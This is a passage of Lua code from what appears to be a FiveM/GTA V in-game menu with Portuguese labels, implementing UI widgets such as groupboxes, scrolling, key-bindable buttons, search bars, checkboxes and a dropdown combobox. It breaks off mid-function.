                    {my.colors.main[1], my.colors.main[2], my.colors.main[3], lineAlpha},
                    60, 5, '##cleanSubtabLineShadow_'..uniqueid
                )
                my.ui.drawRect(
                    xElement,
                    lineY,
                    3,
                    lineH,
                    {
                        my.colors.main[1],
                        my.colors.main[2],
                        my.colors.main[3],
                        lineAlpha
                    },
                    1,
                    false,
                    6,
                    '##cleanSubtabLine_'..uniqueid
                )
            end
            local iconColor
            local textColor
            if isSelected then
                iconColor = {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255}
                textColor = {238, 238, 242, 255}
            elseif isHover then
                iconColor = {184, 184, 190, 255}
                textColor = {200, 200, 206, 255}
            else
                iconColor = {122, 122, 131, 255}
                textColor = {140, 140, 149, 255}
            end
            local faIcon = my.fontAwesome.forEntry(name, tab.id)
            my.ui.drawFontAwesome(faIcon, xElement + 18, yElement + 9, 14,
                iconColor, true, 6, '##cleanSubtabFA_'..uniqueid)
            my.texts.drawText(name or '', xElement + 34, yElement + 8, false, 'left', textScale,
                textColor, 6, '##cleanSubtabText_'..uniqueid)
            if isHover and isLeftButtonJustPressed() and not my.frame.blockClicks then
                tab.cursubtab = id
                my.mainVars.navEntry = tostring(tab.id)..'::'..tostring(my.mainVars.navTitle)
            end
            my.interact.subtabVars.pos.x = my.interact.subtabVars.pos.x + wElement + 5
            if isSelected then
                local previousContentAlpha = my.interact.activeContentAlpha
                my.interact.activeContentAlpha = (my.interact.pageFade and my.interact.pageFade.alpha) or 1.0
                if bridge and type(bridge) == 'function' then
                    my.interact.groupboxVars.pos.x = 0.0
                    my.interact.groupboxVars.pos.y = 0.0
                    my.interact.groupboxVars.maxHeight = 200
                    bridge()
                elseif groupboxes and #groupboxes > 0 then
                    my.interact.groupboxVars.pos.x = 0.0
                    my.interact.groupboxVars.pos.y = 0.0
                    my.interact.groupboxVars.maxHeight = (#groupboxes >= 3) and 175 or 210
                    for _, groupbox in ipairs(groupboxes) do
                        my.interact.groupbox(groupbox.id, groupbox.name, groupbox.height, groupbox.items)
                    end
                end
                my.interact.activeContentAlpha = previousContentAlpha
            end
        end
        my.interact.groupboxVars =
        {
            pos =
            {
                distanceY = 4,
                distanceX = 8,
                x = 0.0,
                y = 0.0,
            },
            curGroupbox = '',
            width = 267,
        }
        my.interact.groupboxes = {}

        local _itemExtents = {
            button       = {top = 16, bottom = 16},
            checkbox     = {top = 12, bottom = 12},
            combobox     = {top = 14, bottom = 34},
            slider       = {top = 12, bottom = 12},
            input        = {top = 12, bottom = 13},
            colorpicker  = {top = 11, bottom = 11},
            listsearch   = {top = 16, bottom = 31},
            listitem     = {top = 13, bottom = 13},
            default      = {top = 16, bottom = 18}
        }
        local _scrollControls = {button=true, checkbox=true, slider=true, input=true, combobox=true}
        my.interact.frame =
        {
            pos =
            {
                x = 0.0,
                y = 0.0,
                add = 0.0,
                addValue = 32,
            },
        }
        my.interact.groupbox = function(id, text, height, items, manualX, manualY, sectionIcon)
            local uniqueid = tostring(id or '')..tostring(text or '')
            if not my.interact.groupboxes[id] then
                my.interact.groupboxes[id] = {
                    closed = false,
                    h = height,
                    yAdjust = 0.0,
                    alpha = 255.0
                }
            end
            local state = my.interact.groupboxes[id]
            state.closed = false
            state.h = tonumber(height) or 180
            state.yAdjust = 0.0
            my.interact.groupboxVars.curGroupbox = id
            local distanceTitle = 15
            local wTitle, hTitle = my.interact.groupboxVars.width, 33
            local hasManualPosition = manualX ~= nil or manualY ~= nil
            local posX = hasManualPosition and (tonumber(manualX) or 0.0) or my.interact.groupboxVars.pos.x
            local posY = hasManualPosition and (tonumber(manualY) or 0.0) or my.interact.groupboxVars.pos.y
            if hasManualPosition then
                local contentLeft = my.pos.elementsBackground.x
                local separatorOffset = my.pos.separatorElements.x - contentLeft
                local maxPosX = math.max(0, my.sizes.elementsBackground[1] - separatorOffset - wTitle - 3)
                posX = math.max(0, math.min(posX, maxPosX))
            end
            local xTitle = my.pos.separatorElements.x + posX
            local yTitle = my.pos.separatorElements.y + distanceTitle + posY
            if hasManualPosition then
                local panelBottom = my.pos.elementsBackground.y + my.sizes.elementsBackground[2] - 8
                local maxBodyHeight = panelBottom - (yTitle + 20)
                if maxBodyHeight > 60 then
                    state.h = math.min(state.h, maxBodyHeight)
                end
            else
                state.h = math.min(state.h, my.interact.groupboxVars.maxHeight or 445)
            end
            if not hasManualPosition and (yTitle + hTitle + state.h) >= (my.pos.elementsBackground.y + my.sizes.elementsBackground[2]) then
                my.interact.groupboxVars.pos.y = 0.0
                my.interact.groupboxVars.pos.x = my.interact.groupboxVars.pos.x + (wTitle + my.interact.groupboxVars.pos.distanceX)
                xTitle = my.pos.separatorElements.x + my.interact.groupboxVars.pos.x
                yTitle = my.pos.separatorElements.y + distanceTitle + my.interact.groupboxVars.pos.y
            end
            local sectionX = xTitle
            local sectionY = yTitle + 5
            local sectionH = state.h + 15
            local headerH = 30
            my.ui.drawRect(
                sectionX, sectionY, wTitle, sectionH,
                {12, 13, 17, 255},
                4, false, 1, '##fenixSection_'..uniqueid
            )
            my.ui.drawRect(
                sectionX, sectionY, wTitle, headerH,
                {15, 18, 23, 255},
                4, false, 2, '##fenixSectionHeader_'..uniqueid
            )
            my.ui.drawRect(
                sectionX, sectionY + headerH, wTitle, 3,
                {15, 18, 23, 255},
                0, false, 2, '##fenixSectionHeaderBottom_'..uniqueid
            )
            local resolvedSectionIcon = sectionIcon
            if type(resolvedSectionIcon) ~= 'string' or resolvedSectionIcon == '' then
                resolvedSectionIcon = my.fontAwesome.forEntry(text, nil)
            end
            my.ui.drawShadowCircle(
                sectionX + 17, sectionY + 16,
                5.0, 5.0,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 220},
                90.0, 4, '##fenixSectionIconShadowOuter_'..uniqueid
            )
            my.ui.drawShadowCircle(
                sectionX + 17, sectionY + 16,
                5.0, 5.0,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255},
                35.0, 5, '##fenixSectionIconShadowInner_'..uniqueid
            )
            my.ui.drawFontAwesome(
                resolvedSectionIcon,
                sectionX + 17, sectionY + 6,
                19.0,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255},
                true, 6, '##fenixSectionIcon_'..uniqueid
            )
            my.texts.drawText(
                text or '',
                sectionX + 34, sectionY + 7,
                false, 'left', 15.0,
                {220, 220, 220, 255},
                6, '##fenixSectionText_'..uniqueid
            )
            my.interact.frame.pos.x = xTitle
            my.interact.frame.pos.y = yTitle + hTitle
            local clipPadding = 7
            local clipTop = yTitle + hTitle
            local clipBottom = (yTitle + 20 + state.h) - clipPadding
            my.interact.currentGroupboxClip = {
                id = tostring(id or uniqueid),
                x = xTitle + clipPadding,
                y = clipTop,
                w = math.max(1, wTitle - (clipPadding * 2)),
                h = math.max(1, clipBottom - clipTop)
            }
            local isClosed = false
            local otherCheck = true
            if not isClosed or otherCheck then
                my.interact.frame.pos.add = 0.0
                if #items > 0 then
                    my.interact.frame.pos.add = 0.0


                    local scrollState = my.interact.scrolls[id]
                    local scrollY = (scrollState and scrollState.y) or 0.0
                    local visibleTop = my.interact.frame.pos.y - 8
                    local visibleBottom = my.interact.frame.pos.y + state.h - 16
                    local buffer = 40
                    for i, item in ipairs(items) do
                        local itemType = string.lower(tostring(item.type or 'default'))
                        local addValue = my.frame.addValues[item.type] or my.frame.addValues[itemType] or my.frame.addValues['default']
                        local extent = _itemExtents[itemType] or _itemExtents.default
                        local centerY = (my.interact.frame.pos.y + 20) + my.interact.frame.pos.add + scrollY
                        local itemTop = centerY - extent.top
                        local itemBottom = centerY + extent.bottom
                        if itemBottom >= (visibleTop - buffer) and itemTop <= (visibleBottom + buffer) then
                            my.rendering.identifyElement(item)
                        else
                            my.interact.frame.pos.add = my.interact.frame.pos.add + addValue
                        end
                    end
                end
                my.interact.frame.currentItemType = 'button'
            end
        my.interact.currentGroupboxClip = nil
        my.interact.activeClipRect = nil
        my.interact.activeDrawOrderOffset = nil
        my.interact.scroll(id, #items, state.h)
        local newY = my.interact.groupboxes[id].h + 20 + my.interact.groupboxVars.pos.distanceY
        if not hasManualPosition then
            my.interact.groupboxVars.pos.y = my.interact.groupboxVars.pos.y + newY
        end
    end
    function my.interact.groupboxInfos()
        local gboxId = my.interact.groupboxVars.curGroupbox
        local groupbox = my.interact.groupboxes[gboxId]
        if groupbox and my.interact.scrolls[gboxId] then
            local x = my.interact.frame.pos.x
            local y = (my.interact.frame.pos.y + 20) + my.interact.frame.pos.add + my.interact.scrolls[gboxId].y
            local w, h = my.interact.groupboxVars.width, groupbox.h
            local bodyTop = my.interact.frame.pos.y - 13
            local bodyBottom = bodyTop + h
            local itemType = my.interact.frame.currentItemType or 'default'
            local extent = _itemExtents[itemType] or _itemExtents.default
            local itemTop = y - extent.top
            local itemBottom = y + extent.bottom
            local visibleTop = my.interact.frame.pos.y - 4
            local visibleBottom = bodyBottom - 7
            local fullyVisible = itemTop >= visibleTop and itemBottom <= visibleBottom
            if _scrollControls[itemType] then
                my.interact.currentItemHiddenByScroll = not fullyVisible
                if not fullyVisible then
                    return true, -10000, -10000, w, h
                end
                return true, x, y, w, h
            end
            my.interact.currentItemHiddenByScroll = false
            return fullyVisible, x, y, w, h
        end
    end
    my.interact.scrolls = {}
    function my.interact.scroll(id, itemsValue, height)
        if not my.interact.scrolls[id] then
            my.interact.scrolls[id] = {
                y = 0.0,
                yDestin = 0.0,
                cursorY = my.mouse.getMouseY() or 0
            }
        end
        local scroll = my.interact.scrolls[id]
        local x, y = my.interact.frame.pos.x, my.interact.frame.pos.y
        local w = my.interact.groupboxVars.width
        local groupbox = my.interact.groupboxes[my.interact.groupboxVars.curGroupbox]
        local h = groupbox and groupbox.h or (height or 0)
        local bodyTop = y - 13
        local isHover = my.mouse.isHovered(x, bodyTop, w, h)
        local contentHeight = math.max(0.0, (my.interact.frame.pos.add or 0.0) + 48.0)
        local visibleHeight = math.max(1.0, h)
        local maxScroll = math.max(0.0, contentHeight - visibleHeight)
        local wheelStep = math.max(24.0, (my.interact.frame.pos.addValue or 32) * 0.90)
        if isHover and maxScroll > 0.0 then
            local wheelDown = IsDisabledControlJustPressed(0, 14) or IsControlJustPressed(0, 14)
            local wheelUp = IsDisabledControlJustPressed(0, 15) or IsControlJustPressed(0, 15)
            if wheelDown then
                scroll.yDestin = scroll.yDestin - wheelStep
            elseif wheelUp then
                scroll.yDestin = scroll.yDestin + wheelStep
            end
        end
        if scroll.yDestin > 0.0 then
            scroll.yDestin = 0.0
        elseif scroll.yDestin < -maxScroll then
            scroll.yDestin = -maxScroll
        end
        if maxScroll <= 0.0 then
            scroll.yDestin = 0.0
        end
        if my.mainVars.draw then
            scroll.y = my.anim.lerp(scroll.y, scroll.yDestin, 0.22)
            if math.abs(scroll.y - scroll.yDestin) < 0.05 then
                scroll.y = scroll.yDestin
            end
            local trackX = x + w - 5
            local sectionBottom = bodyTop + h
            local trackY = y + 7
            local trackBottom = sectionBottom - 8
            local trackH = math.max(12.0, trackBottom - trackY)
            my.ui.drawRect(
                trackX,
                trackY,
                2,
                trackH,
                {67, 63, 72, 90},
                1,
                false,
                10,
                '##groupboxScrollTrack_'..tostring(id)
            )
            if maxScroll > 0.0 then
                local barH = math.max(24.0, trackH * (visibleHeight / math.max(contentHeight, 1.0)))
                barH = math.min(barH, trackH)
                local progress = math.max(0.0, math.min(1.0, (-scroll.y) / maxScroll))
                local barY = trackY + (trackH - barH) * progress
                local barAlpha = isHover and 225 or 165
                my.ui.drawRect(
                    trackX,
                    barY,
                    2,
                    barH,
                    {my.colors.main[1], my.colors.main[2], my.colors.main[3], barAlpha},
                    1,
                    false,
                    11,
                    '##groupboxScrollThumb_'..tostring(id)
                )
            end
        end
    end
    my.interact.buttonVars =
    {
        size = {w = 292, h = 30}
    }
my.interact.buttons = {}
my.interact.button = function(id, text, desc, func)
    local canDisplay, x, y = my.interact.groupboxInfos()
    if not canDisplay then
        return
    end
    if not my.interact.buttons[id] then
        my.interact.buttons[id] = { r = 75.0, g = 75.0, b = 75.0 }
    end
    local buttonState = my.interact.buttons[id]
    local uniqueid = tostring(id or '') .. tostring(text or '') .. tostring(desc or '') .. tostring(my.interact.groupboxVars.curGroupbox or '')
    local rowH = 20
    local rowX = x + 10
    local rowY = y - (rowH / 2)
    local rowW = my.interact.groupboxVars.width - 20
    local isHovered = my.mouse.isHovered(rowX, rowY, rowW, rowH)
    if isHovered
        and not my.frame.blockClicks
        and not my.interact.bindVars.isBinding
        and IsKeyJustPressed(myAPI.Keys['RBUTTON'])
    then
        my.interact.bindVars.isBinding = true
        my.interact.bindVars.curBind = id
    end
    local isBinding = my.interact.bindVars.isBinding and my.interact.bindVars.curBind == id
    if isBinding and (IsKeyJustPressed(myAPI.Keys['ESC']) or IsKeyJustPressed(myAPI.Keys['BACKSPACE'])) then
        my.binds.buttons[id] = nil
        my.interact.bindVars.isBinding = false
        my.interact.bindVars.curBind = false
        isBinding = false
    end
    if isBinding then
        for keyName, keyCode in pairs(myAPI.keysBind) do
            if keyCode and IsKeyJustPressed(keyCode) then
                my.binds.buttons[id] = {
                    func = func,
                    key = keyCode,
                    name = keyName,
                    BindNowButton = true
                }
                my.interact.bindVars.isBinding = false
                my.interact.bindVars.curBind = false
                isBinding = false
                break
            end
        end
    end
    if my.binds.buttons[id] then
        my.binds.buttons[id].func = func
    end
    local targetColor = isHovered and 240 or 75
    buttonState.r = my.anim.lerp(buttonState.r, targetColor, 0.05)
    buttonState.g = my.anim.lerp(buttonState.g, targetColor, 0.05)
    buttonState.b = my.anim.lerp(buttonState.b, targetColor, 0.05)
    local bindText = ''
    if isBinding then
        bindText = ' [...]'
    elseif my.binds.buttons[id] and my.binds.buttons[id].name then
        bindText = ' [' .. tostring(my.binds.buttons[id].name) .. ']'
    end
    my.ui.drawRect(
        rowX,
        rowY,
        rowW,
        rowH,
        {12, 13, 17, 255},
        0,
        false,
        3,
        '##buttonBg_' .. uniqueid
    )
    my.texts.drawText(
        tostring(text or '') .. bindText,
        rowX + 3,
        rowY + 2,
        false,
        'left',
        15.5,
        {math.ceil(buttonState.r), math.ceil(buttonState.g), math.ceil(buttonState.b), 255},
        4,
        '##buttonText_' .. uniqueid
    )
    if isHovered and isLeftButtonJustPressed() and not my.frame.blockClicks then
        if func and type(func) == 'function' then
            nt.createTh(func)
        end
    end
end
    my.interact.listButtonAnimations = my.interact.listButtonAnimations or {}
    local function listButtonAnim(id, target)
        if not my.interact.listButtonAnimations[id] then
            my.interact.listButtonAnimations[id] = {r = target[1], g = target[2], b = target[3]}
        end
        local anim = my.interact.listButtonAnimations[id]
        anim.r = my.anim.lerp(anim.r, target[1], 0.05)
        anim.g = my.anim.lerp(anim.g, target[2], 0.05)
        anim.b = my.anim.lerp(anim.b, target[3], 0.05)
        return math.ceil(anim.r), math.ceil(anim.g), math.ceil(anim.b)
    end
    my.interact.listSearchStates = my.interact.listSearchStates or {}
    my.interact.listSearchBar = function(id, storage, storageKey)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then return end
        local state = my.interact.listSearchStates[id]
        if not state then
            state = {active = false, text = tostring((storage and storage[storageKey]) or '')}
            my.interact.listSearchStates[id] = state
        end
        if storage and storage[storageKey] ~= nil and not state.active then
            state.text = tostring(storage[storageKey] or '')
        end
        local isPlayerSearch = storageKey == 'search:player'
        local label = isPlayerSearch and 'Pesquisar Player' or 'Pesquisar Veículo'
        local placeholder = 'Digite aqui...'
        local bx = x + 10
        local bw = my.interact.groupboxVars.width - 20
        local labelY = y - 19
        local inputY = y + 1
        local inputH = 27
        local hovered = my.mouse.isHovered(bx, inputY, bw, inputH)
        my.texts.drawText(label, bx, labelY, false, 'left', 14.0,
            {151, 147, 157, 255}, 9, '##listSearchLabel_'..id)
        local borderColor
        if state.active then
            borderColor = {my.colors.main[1], my.colors.main[2], my.colors.main[3], 215}
        elseif hovered then
            borderColor = {61, 57, 66, 255}
        else
            borderColor = {43, 40, 47, 255}
        end
        my.ui.drawRect(bx, inputY, bw, inputH, borderColor, 4, false, 7, '##listSearchOuter_'..id)
        my.ui.drawRect(bx + 1, inputY + 1, bw - 2, inputH - 2,
            {20, 19, 23, 255}, 4, false, 8, '##listSearchInner_'..id)
        local displayText = state.text ~= '' and state.text or placeholder
        local shownText = tostring(displayText)
        local reservedRight = 31
        while #shownText > 0 and my.texts.getTextWidth(shownText, 14.5) > (bw - reservedRight - 10) do
            shownText = string.sub(shownText, 2)
        end
        local textColor = state.text ~= '' and 190 or 111
        if state.active and state.text ~= '' then textColor = 218 end
        my.texts.drawText(shownText, bx + 8, inputY + 5, false, 'left', 14.5,
            {textColor, textColor, textColor, 255}, 9, '##listSearchText_'..id)
        local iconX = bx + bw - 25
        my.ui.drawRect(iconX - 4, inputY + 5, 1, inputH - 10,
            {48, 45, 52, 255}, 0, false, 9, '##listSearchSep_'..id)
        my.ui.drawFontAwesome(my.fontAwesome.icons.keyboard, iconX + 7, inputY + 5, 14,
            state.active and {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255}
                         or {120, 116, 127, 255},
            true, 10, '##listSearchKeyboard_'..id)
        if hovered and isLeftButtonJustPressed() and not my.frame.blockClicks then
            state.active = true
        elseif state.active and isLeftButtonJustPressed() and not hovered then
            state.active = false
        end
        if state.active then
            if IsKeyJustPressed(myAPI.Keys['ESC']) or IsKeyJustPressed(myAPI.Keys['ENTER']) then
                state.active = false
            else
                if my.texts.getTextWidth(state.text or '', 14.5) < (bw - reservedRight - 18) then
                    for txt, vkcode in pairs(myAPI.keysTextBox) do
                        if vkcode and IsKeyJustPressed(vkcode) then
                            local add = IsKeyPressed(myAPI.Keys['SHIFT']) and string.upper(txt) or txt
                            state.text = (state.text or '') .. tostring(add)
                        end
                    end
                end
                if IsKeyPressed(myAPI.Keys['BACKSPACE']) and ((my.vars.listSearchBackDelay or 0) < GetGameTimer()) then
                    my.vars.listSearchBackDelay = GetGameTimer() + 150
                    state.text = string.sub(state.text or '', 1, -2)
                end
            end
        end
        if storage then storage[storageKey] = state.text or '' end
    end
    my.interact.alphaListItem = function(id, text, selected, color, func)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then return end
        local rowX, rowW, rowH = x + 10, my.interact.groupboxVars.width - 20, 25
        local rowY = y - (rowH / 2)
        local hovered = my.mouse.isHovered(rowX, rowY, rowW, rowH)
        local uniqueid = 'AlphaList_'..tostring(id)
        if hovered and not selected then
            my.ui.drawRect(rowX, rowY, rowW, rowH,
                {34, 32, 38, 185}, 4, false, 3, '##alphaListHover_'..uniqueid)
        end
        if selected then
            my.ui.drawRect(rowX, rowY, rowW, rowH,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 28},
                4, false, 3, '##alphaListSelectedBg_'..uniqueid)
            my.ui.drawRect(rowX, rowY + 3, 2, rowH - 6,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255},
                1, false, 4, '##alphaListSelected_'..uniqueid)
        end
        local target
        if selected then
            target = {my.colors.main[1], my.colors.main[2], my.colors.main[3]}
        elseif color then
            target = {color[1] or 132, color[2] or 132, color[3] or 132}
        elseif hovered then
            target = {190, 187, 195}
        else
            target = {132, 128, 138}
        end
        local r, g, b = listButtonAnim(uniqueid, target)
        my.texts.drawText(tostring(text or ''), rowX + 7, rowY + 4, false, 'left', 14.5,
            {r, g, b, 255}, 5, '##alphaListText_'..uniqueid)
        if hovered and isLeftButtonJustPressed() and not my.frame.blockClicks and func then
            nt.createTh(func)
        end
    end
    my.interact.checkboxVars =
    {
        x = 0.0,
        alpha = 0.0,
        curCheckbox = false,
    }
    my.interact.bindVars =
    {
        curBind = false,
        isBinding = false,
        button =
        {
            x = 0.0,
            alpha = 0.0,
            twidth = 0.0,
            curText = '',
        },
    }
    my.interact.onetimeRun = {}
    my.interact.checkboxAnimations = my.interact.checkboxAnimations or {}
    my.interact.checkbox = function (id, text, desc, func, color)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then
            return
        end
        local uniqueid = tostring(id or '') .. tostring(text or '') .. tostring(my.interact.groupboxVars.curGroupbox or '')
        local isActive = my.bool[id] or false
        if not my.interact.checkboxAnimations[id] then
            my.interact.checkboxAnimations[id] = {
                textR = 75.0, textG = 75.0, textB = 75.0,
                boxR = isActive and my.colors.main[1] or 22.0,
                boxG = isActive and my.colors.main[2] or 22.0,
                boxB = isActive and my.colors.main[3] or 22.0,
                checkX = 0.0,
                checkA = isActive and 255.0 or 0.0
            }
        end
        local state = my.interact.checkboxAnimations[id]
        local rowX = x + 10
        local rowW = my.interact.groupboxVars.width - 20
        local rowH = 20
        local rowY = y - (rowH / 2)
        local isHovered = my.mouse.isHovered(rowX, rowY, rowW, rowH)
        if isHovered
            and not my.frame.blockClicks
            and not my.interact.bindVars.isBinding
            and IsKeyJustPressed(myAPI.Keys['RBUTTON'])
        then
            my.interact.bindVars.isBinding = true
            my.interact.bindVars.curBind = id
        end
        local isBinding = my.interact.bindVars.isBinding and my.interact.bindVars.curBind == id
        if isBinding and (IsKeyJustPressed(myAPI.Keys['ESC']) or IsKeyJustPressed(myAPI.Keys['BACKSPACE'])) then
            my.binds.checkboxes[id] = nil
            my.interact.bindVars.isBinding = false
            my.interact.bindVars.curBind = false
            isBinding = false
        end
        if isBinding then
            for keyName, keyCode in pairs(myAPI.keysBind) do
                if keyCode and IsKeyJustPressed(keyCode) then
                    my.binds.checkboxes[id] = {
                        key = keyCode,
                        name = keyName,
                        BindNowCheckBox = true,
                        func = function()
                            if func and type(func) == 'function' then
                                func(my.bool[id] or false)
                            end
                        end
                    }
                    my.interact.bindVars.isBinding = false
                    my.interact.bindVars.curBind = false
                    isBinding = false
                    break
                end
            end
        end
        if my.binds.checkboxes[id] then
            my.binds.checkboxes[id].func = function()
                if func and type(func) == 'function' then
                    func(my.bool[id] or false)
                end
            end
        end
        local targetText = isActive and 255 or (isHovered and 240 or 75)
        state.textR = my.anim.lerp(state.textR, targetText, 0.05)
        state.textG = my.anim.lerp(state.textG, targetText, 0.05)
        state.textB = my.anim.lerp(state.textB, targetText, 0.05)
        local targetBoxR = isActive and my.colors.main[1] or 22
        local targetBoxG = isActive and my.colors.main[2] or 22
        local targetBoxB = isActive and my.colors.main[3] or 22
        state.boxR = my.anim.lerp(state.boxR, targetBoxR, 0.12)
        state.boxG = my.anim.lerp(state.boxG, targetBoxG, 0.12)
        state.boxB = my.anim.lerp(state.boxB, targetBoxB, 0.12)
        local boxSize = 18
        local boxX = x + my.interact.groupboxVars.width - 30.5
        local boxY = rowY + 1
        local checkCenterX = boxX + (boxSize / 2)
        local targetCheckX = isActive and checkCenterX or (checkCenterX - 10)
        local targetCheckA = isActive and 255 or 0
        if state.checkX == 0.0 then
            state.checkX = targetCheckX
        end
        state.checkX = my.anim.lerp(state.checkX, targetCheckX, isActive and 0.08 or 0.08)
        state.checkA = my.anim.lerp(state.checkA, targetCheckA, isActive and 0.06 or 0.08)
        local bindText = ''
        if isBinding then
            bindText = ' [...]'
        elseif my.binds.checkboxes[id] and my.binds.checkboxes[id].name then
            bindText = ' [' .. tostring(my.binds.checkboxes[id].name) .. ']'
        end
        my.texts.drawText(
            tostring(text or '') .. bindText,
            rowX + 3,
            rowY + 2,
            false,
            'left',
            15.5,
            {math.ceil(state.textR), math.ceil(state.textG), math.ceil(state.textB), 255},
            10,
            '##checkboxText_' .. uniqueid
        )
        my.ui.drawRect(
            boxX,
            boxY,
            boxSize,
            boxSize,
            {math.ceil(state.boxR), math.ceil(state.boxG), math.ceil(state.boxB), 255},
            4.8,
            false,
            10,
            '##checkboxBox_' .. uniqueid
        )
        my.ui.drawFontAwesome(
            my.fontAwesome.icons.check,
            state.checkX,
            boxY + 2,
            13.0,
            {255, 255, 255, math.floor(state.checkA)},
            true,
            11,
            '##checkboxChecked_' .. uniqueid
        )
        if isHovered and isLeftButtonJustPressed() and not my.frame.blockClicks then
            local newValue = not (my.bool[id] or false)
            my.bool[id] = newValue
            my.interact.checkboxVars.curCheckbox = id
            my.interact.checkboxVars.disable = not newValue
            if func and type(func) == 'function' then
                nt.createTh(function()
                    func(newValue)
                end)
            end
        end
    end
    my.interact.comboBoxes = my.interact.comboBoxes or {}
    my.interact.comboAnimations = my.interact.comboAnimations or {}
    my.interact.comboVars = my.interact.comboVars or {
        curCombo = false
    }
    my.interact.combobox = function(id, text, combotext, desc, items, defoption, func)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then
            return
        end
        items = items or {}
        if not my.interact.comboBoxes[id] then
            local initialOption = defoption
            if initialOption == nil or initialOption == '' then
                initialOption = items[1] or combotext or 'Selecione'
            end
            my.interact.comboBoxes[id] = {
                bool = false,
                option = initialOption,
                scroll = 0
            }
        end
        if not my.interact.comboAnimations[id] then
            my.interact.comboAnimations[id] = {
                r = 170.0,
                g = 170.0,
                b = 170.0,
                offset = 0.0
            }
        end
        local state = my.interact.comboBoxes[id]
        local animation = my.interact.comboAnimations[id]
        local uniqueid = tostring(id or '') .. tostring(text or '') .. tostring(my.interact.groupboxVars.curGroupbox or '')
        local groupWidth = my.interact.groupboxVars.width
        local boxX = x + 11
        local boxWidth = groupWidth - 21
        local titleY = y - 12
        local headerY = y + 12
        local headerHeight = 20
        local optionHeight = 20
        local optionsHeight = (#items * optionHeight) + 5
        local targetOffset = state.bool and optionsHeight or 0
        animation.offset = my.anim.lerp(animation.offset, targetOffset, 0.10)
        if math.abs(animation.offset - targetOffset) < 0.5 then
            animation.offset = targetOffset
        end
        local headerHovered = my.mouse.isHovered(boxX, headerY, boxWidth, headerHeight)
        local targetTextColor = headerHovered and 255 or 65
        animation.r = my.anim.lerp(animation.r, targetTextColor, 0.05)
        animation.g = my.anim.lerp(animation.g, targetTextColor, 0.05)
        animation.b = my.anim.lerp(animation.b, targetTextColor, 0.05)
        local red = math.ceil(animation.r)
        local green = math.ceil(animation.g)
        local blue = math.ceil(animation.b)
        local animatedColor = {red, green, blue, 255}
        local comboOrderBase = (state.bool or animation.offset > 1) and 900 or 8
        local titleScale = 15.5
        local titleText = tostring(text or '') .. ':'
        my.texts.drawText(
            titleText,
            x + 12,
            titleY,
            false,
            'left',
            titleScale,
            animatedColor,
            comboOrderBase + 1,
            '##comboTitle_' .. uniqueid
        )
        if desc and desc ~= '' then
            local titleWidth = my.texts.getTextWidth(titleText, titleScale)
            local descIcon = '(?)'
            local iconX = x + 17 + titleWidth
            local iconWidth = my.texts.getTextWidth(descIcon, titleScale)
            local descHovered = my.mouse.isHovered(iconX, titleY, iconWidth, titleScale)
            my.texts.drawText(
                descIcon,
                iconX,
                titleY,
                false,
                'left',
                titleScale,
                {65, 65, 65, 255},
                comboOrderBase + 1,
                '##comboDescIcon_' .. uniqueid
            )
            if descHovered then
                local descScale = 15.0
                local descWidth = my.texts.getTextWidth(desc, descScale) + 10
                local cursorX, cursorY = my.mouse.getCursorPosition()
                my.ui.drawRect(
                    cursorX,
                    cursorY - 25,
                    descWidth,
                    25,
                    {29, 29, 29, 255},
                    7,
                    false,
                    comboOrderBase + 40,
                    '##comboDescBg_' .. uniqueid
                )
                my.texts.drawText(
                    desc,
                    cursorX + 5,
                    cursorY - 20,
                    false,
                    'left',
                    descScale,
                    animatedColor,
                    comboOrderBase + 41,
                    '##comboDescText_' .. uniqueid
                )
            end
        end
        my.ui.drawRect(
            boxX,
            headerY,
            boxWidth,
            headerHeight + animation.offset,
            {24, 24, 27, 255},
            4,
            false,
            comboOrderBase,
            '##comboBackground_' .. uniqueid
        )
        local selectedText = tostring(state.option or combotext or 'Selecione')
        my.texts.drawText(
            'Opção: ' .. selectedText,
            boxX + 6,
            headerY + 3,
            false,
            'left',
            15.5,
            animatedColor,
            comboOrderBase + 2,
            '##comboSelected_' .. uniqueid
        )
        local iconX = boxX + boxWidth - 18
        local iconY = headerY + 6
        for line = 0, 2 do
            my.ui.drawRect(
                iconX,
                iconY + (line * 4),
                8,
                1,
                animatedColor,
                0,
                false,
                comboOrderBase + 2,
                '##comboListIcon_' .. uniqueid .. '_' .. tostring(line)
            )
        end
        if headerHovered and isLeftButtonJustPressed() then
            if not my.frame.blockClicks or state.bool then
                local opening = not state.bool
                if opening and my.interact.comboVars.curCombo and my.interact.comboVars.curCombo ~= id then
                    local previous = my.interact.comboBoxes[my.interact.comboVars.curCombo]
                    if previous then previous.bool = false end
                end
                state.bool = opening
                state.scroll = 0
                my.interact.comboVars.curCombo = state.bool and id or false
                my.frame.blockClicks = state.bool
            end
        end
        if state.bool and (IsDisabledControlPressed(1, 15) or IsDisabledControlPressed(1, 14)) then
            state.bool = false
            state.scroll = 0
            my.interact.comboVars.curCombo = false
            my.frame.blockClicks = false
        end
        local dropdownTop = headerY + headerHeight
        local visibleDropdownHeight = animation.offset
        local dropdownHovered = my.mouse.isHovered(
            boxX,
            headerY,
            boxWidth,
            headerHeight + math.max(visibleDropdownHeight, 0)
        )
        if state.bool or animation.offset > 1 then
            for index, item in ipairs(items) do
                local itemY = dropdownTop + ((index - 1) * optionHeight) - (state.scroll or 0)
                local relativeBottom = (index * optionHeight)
                if relativeBottom <= visibleDropdownHeight + 1 then
                    local itemHovered = my.mouse.isHovered(boxX, itemY, boxWidth - 3, optionHeight)
                    local itemColorValue = itemHovered and 255 or 56
                    local itemColor = {itemColorValue, itemColorValue, itemColorValue, 255}
                    my.texts.drawText(
                        tostring(item),
                        boxX + 6,
                        itemY + 3,
                        false,
                        'left',
                        15.5,
                        itemColor,
                        comboOrderBase + 3,
                        '##comboItem_' .. uniqueid .. '_' .. tostring(index)
                    )
                    if state.bool and itemHovered and isLeftButtonJustPressed() then
                        state.option = item
                        state.bool = false
                        state.scroll = 0
                        my.interact.comboVars.curCombo = false
                        if func and type(func) == 'function' then
